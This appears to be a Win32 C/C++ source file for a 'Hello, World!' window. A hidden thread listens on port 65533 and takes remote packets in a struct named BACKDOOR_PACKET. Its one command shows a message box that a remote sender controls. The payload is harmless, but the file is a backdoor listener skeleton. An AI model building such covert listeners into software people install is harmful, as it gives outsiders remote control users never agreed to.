#include <Windows.h>
#include <stdio.h>

#include "sockServer.h"

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void socketServer();


static TCHAR szTitle[] = _T("Win32 GUI Application");
static TCHAR szWindowClass[] = _T("Win32App");
COLORREF bkColor = RGB(33, 33, 33); // grey
int wndWidth = 320;
int wndHight = 240;

typedef struct _BACKDOOR_PACKET
{
	BYTE Operation;
	char Buffer[1024];
}BACKDOOR_PACKET, *PBACKDOOR_PACKET;

#define BACKDOOR_DISPLAY_MESSAGE 8

char *serverCallback(void *params)
{
	printf("Callback function has been called\n");

	char *response = (char *)VirtualAlloc(NULL, 64, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	switch (((PBACKDOOR_PACKET)params)->Operation)
	{
		case BACKDOOR_DISPLAY_MESSAGE:
			MessageBox(NULL, ((PBACKDOOR_PACKET)params)->Buffer, NULL, MB_OK);
			strcat(response, "A message has ben displayed!");
			break;



		default:
			strcat(response, "Error: Invalid command.");
			break;
	}

	return response;
}

void socketServer()
{
	sockServer sS(65533, &serverCallback);

	if (sS.sockSetup())
		sS.sockStart();
}

int WINAPI WinMain(	HINSTANCE hInstance,
					HINSTANCE hPrevInstance,
					LPSTR lpCmdLine,
					int nCmdShow)
{
	AllocConsole();
	freopen("CON", "wt", stdout);
	freopen("CON", "wt", stderr);

	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);
	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, IDI_APPLICATION); 
	wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground = CreateSolidBrush(bkColor);
	wcex.lpszMenuName = NULL;
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(wcex.hInstance, IDI_APPLICATION);

	if (!RegisterClassEx(&wcex))
	{
		MessageBox(NULL,
			_T("Call to RegisterClassEx failed!"),
			_T("Win32 GUI App"),
			NULL);

		return 1;
	}

	const HWND hDesktop = GetDesktopWindow();
	RECT desktop;

	// calculate mid screen
	GetWindowRect(hDesktop, &desktop);
	int horizontal = (desktop.right / 2) - (wndWidth / 2);
	int vertical = (desktop.bottom / 2) - (wndHight / 2);

	HWND hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, horizontal, vertical, wndWidth, wndHight, NULL, NULL, hInstance, NULL);

	if (!hWnd)
	{
		MessageBox(NULL,
			_T("Call to CreateWindow failed!"),
			_T("Win32 GUI App"),
			NULL);

		return 1;
	}

	// Start socket thread
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)socketServer, NULL, 0, NULL);

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	MSG msg;

	while(GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return (int)msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	HDC hdc;
	PAINTSTRUCT ps;
	TCHAR greeting[] = _T("Hello, World!");

	switch (message)
	{
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);

		// Here your application is laid out.
		// For this introduction, we just print out "Hello, World!"
		// in the top left corner.
		SetBkColor(hdc, bkColor);
		SetTextColor(hdc, RGB(255, 255, 255));
		TextOut(hdc, 5, 5, greeting, _tcslen(greeting));

		// End application specific layout section.
		EndPaint(hWnd, &ps);
		break;

	case WM_DESTROY:
		PostQuitMessage(0);
		break;

	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
		break;
	}

	return 0;
}